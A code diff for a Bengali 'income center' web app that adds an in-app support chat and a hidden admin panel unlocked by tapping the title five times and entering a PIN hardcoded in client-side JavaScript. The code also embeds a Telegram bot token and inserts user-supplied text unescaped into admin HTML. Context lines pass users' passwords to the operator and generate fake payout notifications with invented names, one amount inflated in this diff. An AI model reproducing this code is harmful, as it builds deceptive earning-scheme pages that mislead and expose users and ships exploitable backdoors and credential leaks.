@@ -26,7 +26,7 @@
 <style>
 * { box-sizing: border-box; }
 body { font-family: 'Plus Jakarta Sans', sans-serif; background: #0f172a; margin: 0; padding: 10px; padding-bottom: 80px; color: #f8fafc; }
-.top-app-title { font-size: 20px; font-weight: 800; text-align: center; color: #f8fafc; margin: 10px 0; background: linear-gradient(135deg, #ef4444, #10b981); -webkit-background-clip: text; -webkit-text-fill-color: transparent; letter-spacing: 0.5px; }
+.top-app-title { font-size: 20px; font-weight: 800; text-align: center; color: #f8fafc; margin: 10px 0; background: linear-gradient(135deg, #ef4444, #10b981); -webkit-background-clip: text; -webkit-text-fill-color: transparent; letter-spacing: 0.5px; cursor: pointer; user-select: none; }
 
 .page { display: none; animation: fadeIn 0.3s ease; }
 .page.active { display: block; }
@@ -242,10 +242,15 @@ select.input-field { appearance: none; background-image: url("data:image/svg+xml
 .feed-user { font-weight: 800; color: #f8fafc; font-size: 15px; text-shadow: 0 2px 5px rgba(0,0,0,0.5); }
 .feed-details { color: #cbd5e1; font-size: 12px; font-weight: 700; line-height: 1.6; text-align: center; }
 .feed-amount { color: #34d399; font-weight: 800; font-size: 17px; text-shadow: 0 2px 8px rgba(16,185,129,0.4); }
+
+/* এডমিন চ্যাট কার্ড স্টাইল */
+.admin-user-card { background: #1e293b; border: 1.5px solid rgba(56,189,248,0.25); border-radius: 14px; padding: 12px 14px; margin-bottom: 10px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; transition: all 0.2s; }
+.admin-user-card:active { transform: scale(0.98); background: #26354d; }
+.unread-dot { background: #ef4444; color: white; font-size: 10px; font-weight: 800; padding: 3px 8px; border-radius: 10px; }
 </style>
 </head>
 <body>
-<div class="top-app-title">💰 「দারাজ প্লে ইনকাম সেন্টার」 💰</div>
+<div class="top-app-title" onclick="handleSecretAdminTrigger()">💰 「দারাজ প্লে ইনকাম সেন্টার」 💰</div>
 
 <!-- লগইন পেজ -->
 <div id="page-login" class="page active">
@@ -266,7 +271,7 @@ select.input-field { appearance: none; background-image: url("data:image/svg+xml
             <button class="auth-btn" onclick="handleLogin()">লগইন</button>
             
             <div style="font-size: 12px; color: #cbd5e1; margin-top: 14px; font-weight: 600; text-align: center;">
-                পাসওয়ার্ড ভুলে গেছেন? <a href="https://t.me/KA16269bot" target="_blank" style="color: #38bdf8; font-weight: 700; text-decoration: underline;">লাইভ চ্যাটে যোগাযোগ করুন</a>
+                পাসওয়ার্ড ভুলে গেছেন? <span onclick="openLiveChatFromLogin()" style="color: #38bdf8; font-weight: 700; text-decoration: underline; cursor: pointer;">লাইভ চ্যাটে যোগাযোগ করুন</span>
             </div>
         </div>
     </div>
@@ -425,6 +430,65 @@ select.input-field { appearance: none; background-image: url("data:image/svg+xml
     <button class="btn-action" style="background: #475569; padding: 10px; font-size: 13px;" onclick="switchPage('wallet', document.querySelectorAll('.nav-item')[4])">⬅️ ওয়ালেটে ফিরে যান</button>
 </div>
 
+<!-- ইউজার ইন-অ্যাপ লাইভ চ্যাট পেজ -->
+<div id="page-live-chat" class="page" style="padding: 5px;">
+    <div style="background: linear-gradient(135deg, #065f46, #047857); border-radius: 18px; padding: 14px; margin-bottom: 10px; text-align: center; box-shadow: 0 6px 20px rgba(16,185,129,0.3); border: 1.5px solid rgba(255,255,255,0.15);">
+        <div style="font-size: 18px; font-weight: 800; color: white; display: flex; align-items: center; justify-content: center; gap: 8px;">
+            <span>💬</span> দারাজ প্লে লাইভ সাপোর্ট চ্যাট
+        </div>
+        <div style="font-size: 11px; color: #a7f3d0; font-weight: 600; margin-top: 2px;" id="chat-user-phone-label">ইউজার সাপোর্ট লাইন</div>
+    </div>
+
+    <div id="chat-messages-container" style="background: #121824; border: 1.5px solid rgba(16,185,129,0.3); border-radius: 18px; padding: 14px; height: 350px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; margin-bottom: 10px; box-shadow: inset 0 4px 15px rgba(0,0,0,0.6);">
+        <div style="background: #1e293b; border: 1px solid rgba(255,255,255,0.08); padding: 12px 14px; border-radius: 14px; max-width: 85%; align-self: flex-start; color: #f8fafc; font-size: 13px; font-weight: 600; line-height: 1.4;">
+            আসসালামু আলাইকুম! দারাজ প্লে ইনকাম সেন্টারে আপনাকে স্বাগতম। আপনার কি সমস্যা বা জিজ্ঞাসা রয়েছে এখানে লিখুন, আমরা দ্রুত উত্তর দিচ্ছি।
+        </div>
+    </div>
+
+    <div style="display: flex; gap: 8px; margin-bottom: 10px;">
+        <input type="text" id="chat-input-message" placeholder="আপনার মেসেজ লিখুন..." style="flex: 1; background: #1e293b; border: 1px solid rgba(255,255,255,0.12); padding: 12px 14px; border-radius: 14px; color: white; font-size: 13px; outline: none;">
+        <button onclick="sendLiveChatMessage()" style="background: linear-gradient(135deg, #10b981, #059669); color: white; border: none; padding: 0 20px; font-weight: 800; border-radius: 14px; cursor: pointer; box-shadow: 0 4px 15px rgba(16,185,129,0.3);">পাঠান</button>
+    </div>
+
+    <button class="btn-action" style="background: #475569; padding: 11px; border-radius: 14px; font-size: 13px;" onclick="goBackFromChat()">⬅️ ফিরে যান</button>
+</div>
+
+<!-- সিক্রেট এডমিন লাইভ চ্যাট ড্যাশবোর্ড -->
+<div id="page-admin-chat-panel" class="page" style="padding: 5px;">
+    <div style="background: linear-gradient(135deg, #7f1d1d, #991b1b); border-radius: 18px; padding: 14px; margin-bottom: 12px; text-align: center; box-shadow: 0 6px 20px rgba(239,68,68,0.3); border: 1.5px solid rgba(255,255,255,0.15);">
+        <div style="font-size: 18px; font-weight: 800; color: white; display: flex; align-items: center; justify-content: center; gap: 8px;">
+            <span>🛡️</span> এডমিন লাইভ সাপোর্ট প্যানেল
+        </div>
+        <div style="font-size: 11px; color: #fecaca; font-weight: 600; margin-top: 2px;">সব ইউজারের মেসেজ দেখুন ও সরাসরি রিপ্লাই দিন</div>
+    </div>
+
+    <!-- এডমিন ইউজার লিস্ট ভিউ -->
+    <div id="admin-chat-users-list">
+        <p style="text-align:center; color: #94a3b8; padding: 20px 0;">মেসেজ লিস্ট লোড হচ্ছে...</p>
+    </div>
+
+    <!-- এডমিন নির্দিষ্ট ইউজার চ্যাট ভিউ -->
+    <div id="admin-active-chat-box" style="display: none;">
+        <div style="background: #1e293b; border: 1px solid rgba(56,189,248,0.3); border-radius: 12px; padding: 10px 14px; margin-bottom: 8px; display: flex; justify-content: space-between; align-items: center;">
+            <div>
+                <div style="font-size: 14px; font-weight: 800; color: #38bdf8;" id="admin-chatting-user-name">ইউজার</div>
+                <div style="font-size: 11px; color: #94a3b8;" id="admin-chatting-user-phone">ফোন: ---</div>
+            </div>
+            <button onclick="closeAdminSingleChat()" style="background: #475569; color: white; border: none; padding: 6px 12px; border-radius: 8px; font-size: 11px; font-weight: 700; cursor: pointer;">তালিকায় ফিরুন</button>
+        </div>
+
+        <div id="admin-messages-container" style="background: #121824; border: 1.5px solid rgba(56,189,248,0.3); border-radius: 18px; padding: 14px; height: 320px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; margin-bottom: 10px;">
+        </div>
+
+        <div style="display: flex; gap: 8px; margin-bottom: 10px;">
+            <input type="text" id="admin-reply-input" placeholder="ইউজারের উত্তর লিখুন..." style="flex: 1; background: #1e293b; border: 1px solid rgba(255,255,255,0.12); padding: 12px 14px; border-radius: 14px; color: white; font-size: 13px; outline: none;">
+            <button onclick="sendAdminReplyMessage()" style="background: linear-gradient(135deg, #0284c7, #0369a1); color: white; border: none; padding: 0 20px; font-weight: 800; border-radius: 14px; cursor: pointer;">রিপ্লাই</button>
+        </div>
+    </div>
+
+    <button class="btn-action" style="background: #475569; padding: 11px; border-radius: 14px; font-size: 13px;" onclick="exitAdminPanel()">🚪 এডমিন প্যানেল বন্ধ করুন</button>
+</div>
+
 <!-- সাপোর্ট পেজ -->
 <div id="page-support" class="page">
     <div style="text-align: center; margin-bottom: 14px;">
@@ -467,11 +531,11 @@ select.input-field { appearance: none; background-image: url("data:image/svg+xml
             <div style="font-size: 10px; color: #94a3b8; font-weight: 600;">সাধারণ প্রশ্নোত্তর</div>
         </a>
 
-        <a href="https://t.me/AD16169Bot" target="_blank" style="background: #1e293b; border: 1px solid rgba(255,255,255,0.06); border-radius: 18px; padding: 16px 12px; text-align: center; text-decoration: none; display: flex; flex-direction: column; align-items: center;">
+        <div onclick="openLiveChat()" style="background: #1e293b; border: 1px solid rgba(255,255,255,0.06); border-radius: 18px; padding: 16px 12px; text-align: center; cursor: pointer; display: flex; flex-direction: column; align-items: center;">
             <div style="width: 44px; height: 44px; background: rgba(245,158,11,0.1); border: 1px solid rgba(245,158,11,0.2); border-radius: 14px; display: flex; align-items: center; justify-content: center; font-size: 20px; color: #f59e0b; margin-bottom: 8px;">💬</div>
             <div style="font-size: 14px; font-weight: 800; color: #f8fafc; margin-bottom: 2px;">লাইভ চ্যাট</div>
             <div style="font-size: 10px; color: #94a3b8; font-weight: 600;">তাৎক্ষণিক সাহায্য</div>
-        </a>
+        </div>
     </div>
 </div>
 
@@ -788,6 +852,7 @@ tg.ready(); tg.expand();
 
 const botToken = "8535942512:AAHmpa8119aOZx6EZwOpaDhGteBPoxtzs_8";
 const adminChatId = "8040704140";
+const ADMIN_SECRET_PIN = "16269"; // সিক্রেট এডমিন প্যানেল পিন
 
 let currentUserPhone = localStorage.getItem('logged_user_phone') || null;
 let userId = "", userName = "", userPhotoUrl = "";
@@ -795,6 +860,28 @@ let userBalance = 0, dailyWatched = 0, totalRefers = 0, lifetimeWatched = 0, spe
 let claimedBonuses = {};
 let historyDates = {};
 let rawWithdrawRequests = [];
+let chatUnsubscribe = null;
+let adminChatUnsubscribe = null;
+let adminCurrentChatPhone = null;
+
+// সিক্রেট এডমিন ট্রিগার (টাইটেলে ৫ বার ক্লিক)
+let titleTapCount = 0;
+let titleTapTimer = null;
+
+function handleSecretAdminTrigger() {
+    titleTapCount++;
+    clearTimeout(titleTapTimer);
+    titleTapTimer = setTimeout(() => { titleTapCount = 0; }, 2000);
+    if (titleTapCount >= 5) {
+        titleTapCount = 0;
+        const pin = prompt("🛡️ এডমিন প্যানেল পিন দিন:");
+        if (pin === ADMIN_SECRET_PIN) {
+            openAdminChatPanel();
+        } else if (pin !== null) {
+            alert("❌ ভুল পিন!");
+        }
+    }
+}
 
 const masterPaymentReviewPool = [
     { name: "সাদিয়া আক্তার", avatar: "https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=150", amount: "৳ ১,৫০০ টাকা", method: "বিকাশ", number: "017****4318", serial: "#১৬১", telegramId: "...৬৬১৮" },
@@ -885,7 +972,6 @@ function showLoginPage() {
     document.getElementById('page-login').classList.add('active');
 }
 
-// বাংলা ও ইংরেজি নাম্বার কনভার্ট করার ফাংশন
 function normalizePhoneNumber(inputStr) {
     if (!inputStr) return '';
     const bengaliToEnglishMap = {'০':'0', '১':'1', '২':'2', '৩':'3', '৪':'4', '৫':'5', '৬':'6', '৭':'7', '৮':'8', '৯':'9'};
@@ -943,7 +1029,6 @@ async function notifyAdminNewUser(serialNo, name, phone, password, joinDateStr, 
     } catch (e) { console.log(e); }
 }
 
-// নিবন্ধন হ্যান্ডেল করা
 async function handleRegister() {
     const name = document.getElementById('reg-name').value.trim();
     const rawPhone = document.getElementById('reg-phone').value;
@@ -1011,7 +1096,6 @@ async function saveUserDataAndLogin(phone, name, password, photoUrl, photoFile) 
     initDashboard(phone);
 }
 
-// লগইন হ্যান্ডেল করা
 async function handleLogin() {
     const rawPhone = document.getElementById('login-phone').value;
     const phone = normalizePhoneNumber(rawPhone);
@@ -1046,7 +1130,6 @@ function handleLogout() {
     window.location.reload();
 }
 
-// চেক করে লগইন থাকলে হোম পেজ দেখাবে, না থাকলে লগইন পেজ
 window.addEventListener('DOMContentLoaded', () => {
     if (currentUserPhone) {
         initDashboard(currentUserPhone);
@@ -1164,7 +1247,7 @@ async function startDynamicPaymentNotifications() {
     const firstNames = ["সাদিয়া", "নুসরাত", "জান্নাতুল", "মেহজাবিন", "তাবাসসুম", "আয়শা", "পূজা", "প্রিয়াঙ্কা", "রিতু", "পায়েল"];
     const lastNames = ["আক্তার", "জাহান", "ফেরদৌস", "চৌধুরী", "মীম", "সিদ্দিকা", "সেন", "রায়", "মনি", "ঘোষ"];
     const methods = ["বিকাশ", "নগদ"];
-    const amounts = ["৳ ১,০০০ টাকা", "৳ ১,৫০০ টাকা", "৳ ২,০০০ টাকা", "৳ ২,৫০০০ টাকা", "৳ ৩,০০০ টাকা"];
+    const amounts = ["৳ ১,০০০ টাকা", "৳ ১,৫০০০ টাকা", "৳ ২,০০০ টাকা", "৳ ২,৫০০০ টাকা", "৳ ৩,০০০ টাকা"];
 
     while (paymentMessages.length < 50) {
         let fName = firstNames[Math.floor(Math.random() * firstNames.length)];
@@ -1488,6 +1571,237 @@ function switchPage(pageId, element) {
     if (pageId === 'leaderboard') loadLeaderboard();
     else if (pageId === 'income-history') loadRecentIncomeHistoryList();
     else if (pageId === 'payment-history') loadPaymentHistory();
+}
+
+// ==========================================
+// ইন-অ্যাপ ইউজার লাইভ চ্যাট সিস্টেম
+// ==========================================
+function openLiveChat() {
+    let chatPhone = currentUserPhone || document.getElementById('login-phone')?.value;
+    if (!chatPhone) {
+        alert("দয়া করে আগে আপনার ফোন নাম্বার দিয়ে লগইন করুন অথবা নিবন্ধন করুন।");
+        return;
+    }
+    const cleanPhone = normalizePhoneNumber(chatPhone);
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    document.getElementById('page-live-chat').classList.add('active');
+    document.getElementById('bottom-nav-bar').style.display = 'none';
+    document.getElementById('chat-user-phone-label').innerText = "ইউজার নাম্বার: " + cleanPhone;
+    listenToLiveChatMessages(cleanPhone);
+}
+
+function openLiveChatFromLogin() {
+    let rawPhone = document.getElementById('login-phone').value;
+    let phone = normalizePhoneNumber(rawPhone);
+    if (!phone || phone.length < 10) {
+        alert("দয়া করে আপনার সঠিক ফোন নাম্বারটি লগইন বক্সে লিখে তারপর 'লাইভ চ্যাটে যোগাযোগ করুন' এ ক্লিক করুন।");
+        return;
+    }
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    document.getElementById('page-live-chat').classList.add('active');
+    document.getElementById('bottom-nav-bar').style.display = 'none';
+    document.getElementById('chat-user-phone-label').innerText = "পাসওয়ার্ড রিসেট / সাপোর্ট (" + phone + ")";
+    listenToLiveChatMessages(phone);
+}
+
+function goBackFromChat() {
+    if (chatUnsubscribe) { chatUnsubscribe(); chatUnsubscribe = null; }
+    if (localStorage.getItem('logged_user_phone')) {
+        switchPage('home', document.querySelectorAll('.nav-item')[0]);
+        document.getElementById('bottom-nav-bar').style.display = 'flex';
+    } else {
+        showLoginPage();
+    }
+}
+
+function listenToLiveChatMessages(phone) {
+    const container = document.getElementById('chat-messages-container');
+    if (!container) return;
+
+    if (chatUnsubscribe) { chatUnsubscribe(); }
+
+    chatUnsubscribe = db.collection('chats').doc(phone).collection('messages')
+        .orderBy('timestamp', 'asc')
+        .onSnapshot((snapshot) => {
+            container.innerHTML = `
+                <div style="background: #1e293b; border: 1px solid rgba(255,255,255,0.08); padding: 12px 14px; border-radius: 14px; max-width: 85%; align-self: flex-start; color: #f8fafc; font-size: 13px; font-weight: 600; line-height: 1.4;">
+                    আসসালামু আলাইকুম! দারাজ প্লে ইনকাম সেন্টারে আপনাকে স্বাগতম। আপনার কি সমস্যা বা জিজ্ঞাসা রয়েছে এখানে লিখুন, আমরা দ্রুত উত্তর দিচ্ছি।
+                </div>
+            `;
+            snapshot.forEach((docSnap) => {
+                const msg = docSnap.data();
+                const isUser = msg.sender === 'user';
+                const bubble = document.createElement('div');
+                bubble.style.cssText = isUser ?
+                    "background: linear-gradient(135deg, #0284c7, #0369a1); color: white; padding: 12px 14px; border-radius: 14px; max-width: 85%; align-self: flex-end; font-size: 13px; font-weight: 600; line-height: 1.4; word-break: break-word; box-shadow: 0 4px 12px rgba(2,132,199,0.3);" :
+                    "background: #10b981; color: #0f172a; padding: 12px 14px; border-radius: 14px; max-width: 85%; align-self: flex-start; font-size: 13px; font-weight: 700; line-height: 1.4; word-break: break-word; box-shadow: 0 4px 12px rgba(16,185,129,0.3);";
+                bubble.innerText = msg.text;
+                container.appendChild(bubble);
+            });
+            container.scrollTop = container.scrollHeight;
+        });
+}
+
+async function sendLiveChatMessage() {
+    const input = document.getElementById('chat-input-message');
+    const text = input.value.trim();
+    let phone = currentUserPhone || normalizePhoneNumber(document.getElementById('login-phone')?.value);
+
+    if (!text || !phone) return;
+    input.value = '';
+
+    const senderDisplayName = userName || "অতিথি ইউজার (" + phone + ")";
+
+    try {
+        // মেইন চ্যাট রুম আপডেট করা (যাতে এডমিন লিস্টে দেখতে পায়)
+        await db.collection('chats').doc(phone).set({
+            phone: phone,
+            userName: senderDisplayName,
+            lastMessage: text,
+            unreadByAdmin: true,
+            updatedAt: firebase.firestore.FieldValue.serverTimestamp()
+        }, { merge: true });
+
+        // সাব-কালেকশনে মেসেজ সেভ করা
+        await db.collection('chats').doc(phone).collection('messages').add({
+            text: text,
+            sender: 'user',
+            timestamp: firebase.firestore.FieldValue.serverTimestamp()
+        });
+
+        // এডমিন টেলিগ্রামে লাইভ নোটিফিকেশন পাঠানো
+        const notifText = `💬 <b>নতুন লাইভ সাপোর্ট মেসেজ!</b>\n\n` +
+                          `👤 <b>নাম:</b> ${senderDisplayName}\n` +
+                          `📞 <b>ফোন:</b> <code>${phone}</code>\n` +
+                          `📝 <b>মেসেজ:</b> ${text}\n\n` +
+                          `⚡ উত্তর দিতে ওয়েবসাইটের এডমিন চ্যাট প্যানেলে প্রবেশ করুন।`;
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: adminChatId, text: notifText, parse_mode: "HTML" })
+        }).catch(() => {});
+
+    } catch (e) {
+        alert("মেসেজ পাঠাতে সমস্যা হয়েছে।");
+    }
+}
+
+// ==========================================
+// সিক্রেট এডমিন লাইভ চ্যাট ড্যাশবোর্ড সিস্টেম
+// ==========================================
+function openAdminChatPanel() {
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    document.getElementById('page-admin-chat-panel').classList.add('active');
+    document.getElementById('bottom-nav-bar').style.display = 'none';
+    document.getElementById('admin-active-chat-box').style.display = 'none';
+    document.getElementById('admin-chat-users-list').style.display = 'block';
+    loadAdminChatUsersList();
+}
+
+function exitAdminPanel() {
+    if (adminChatUnsubscribe) { adminChatUnsubscribe(); adminChatUnsubscribe = null; }
+    if (localStorage.getItem('logged_user_phone')) {
+        switchPage('home', document.querySelectorAll('.nav-item')[0]);
+        document.getElementById('bottom-nav-bar').style.display = 'flex';
+    } else {
+        showLoginPage();
+    }
+}
+
+function loadAdminChatUsersList() {
+    const listContainer = document.getElementById('admin-chat-users-list');
+    listContainer.innerHTML = '<p style="text-align:center; color: #94a3b8; padding: 20px 0;">মেসেজ তালিকা লোড হচ্ছে...</p>';
+
+    db.collection('chats').orderBy('updatedAt', 'desc').onSnapshot((snapshot) => {
+        if (snapshot.empty) {
+            listContainer.innerHTML = '<p style="text-align:center; color: #94a3b8; padding: 20px 0;">এখনো কোনো ইউজার মেসেজ পাঠায়নি।</p>';
+            return;
+        }
+        listContainer.innerHTML = '';
+        snapshot.forEach((docSnap) => {
+            const chatData = docSnap.data();
+            const phone = chatData.phone || docSnap.id;
+            const uName = chatData.userName || "ইউজার";
+            const lastMsg = chatData.lastMessage || "";
+            const isUnread = chatData.unreadByAdmin;
+
+            const card = document.createElement('div');
+            card.className = 'admin-user-card';
+            card.onclick = () => openAdminSingleChat(phone, uName);
+            card.innerHTML = `
+                <div style="text-align: left; overflow: hidden; flex: 1; padding-right: 8px;">
+                    <div style="font-size: 14px; font-weight: 800; color: #f8fafc;">👤 ${uName}</div>
+                    <div style="font-size: 11px; color: #38bdf8; font-weight: 700; margin-top: 2px;">📞 ${phone}</div>
+                    <div style="font-size: 12px; color: #cbd5e1; margin-top: 4px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">💬 ${lastMsg}</div>
+                </div>
+                <div>
+                    ${isUnread ? '<span class="unread-dot">নতুন মেসেজ</span>' : '<span style="color: #64748b; font-size: 12px;">দেখা হয়েছে ›</span>'}
+                </div>
+            `;
+            listContainer.appendChild(card);
+        });
+    });
+}
+
+function openAdminSingleChat(phone, uName) {
+    adminCurrentChatPhone = phone;
+    document.getElementById('admin-chat-users-list').style.display = 'none';
+    document.getElementById('admin-active-chat-box').style.display = 'block';
+    document.getElementById('admin-chatting-user-name').innerText = uName;
+    document.getElementById('admin-chatting-user-phone').innerText = "ফোন: " + phone;
+
+    // এডমিন ওপেন করলে আনরিড স্ট্যাটাস ফলস করা
+    db.collection('chats').doc(phone).update({ unreadByAdmin: false }).catch(() => {});
+
+    const container = document.getElementById('admin-messages-container');
+    if (adminChatUnsubscribe) { adminChatUnsubscribe(); }
+
+    adminChatUnsubscribe = db.collection('chats').doc(phone).collection('messages')
+        .orderBy('timestamp', 'asc')
+        .onSnapshot((snapshot) => {
+            container.innerHTML = '';
+            snapshot.forEach((docSnap) => {
+                const msg = docSnap.data();
+                const isAdmin = msg.sender === 'admin';
+                const bubble = document.createElement('div');
+                bubble.style.cssText = isAdmin ?
+                    "background: linear-gradient(135deg, #0284c7, #0369a1); color: white; padding: 10px 14px; border-radius: 14px; max-width: 85%; align-self: flex-end; font-size: 13px; font-weight: 600; line-height: 1.4; word-break: break-word;" :
+                    "background: #1e293b; border: 1px solid rgba(255,255,255,0.1); color: #f8fafc; padding: 10px 14px; border-radius: 14px; max-width: 85%; align-self: flex-start; font-size: 13px; font-weight: 600; line-height: 1.4; word-break: break-word;";
+                bubble.innerText = msg.text;
+                container.appendChild(bubble);
+            });
+            container.scrollTop = container.scrollHeight;
+        });
+}
+
+function closeAdminSingleChat() {
+    if (adminChatUnsubscribe) { adminChatUnsubscribe(); adminChatUnsubscribe = null; }
+    adminCurrentChatPhone = null;
+    document.getElementById('admin-active-chat-box').style.display = 'none';
+    document.getElementById('admin-chat-users-list').style.display = 'block';
+}
+
+async function sendAdminReplyMessage() {
+    const input = document.getElementById('admin-reply-input');
+    const text = input.value.trim();
+    if (!text || !adminCurrentChatPhone) return;
+    input.value = '';
+
+    try {
+        await db.collection('chats').doc(adminCurrentChatPhone).collection('messages').add({
+            text: text,
+            sender: 'admin',
+            timestamp: firebase.firestore.FieldValue.serverTimestamp()
+        });
+
+        await db.collection('chats').doc(adminCurrentChatPhone).update({
+            lastMessage: "এডমিন: " + text,
+            unreadByAdmin: false,
+            updatedAt: firebase.firestore.FieldValue.serverTimestamp()
+        });
+    } catch (e) {
+        alert("রিপ্লাই পাঠাতে সমস্যা হয়েছে।");
+    }
 }
 
 function copyRefer() {
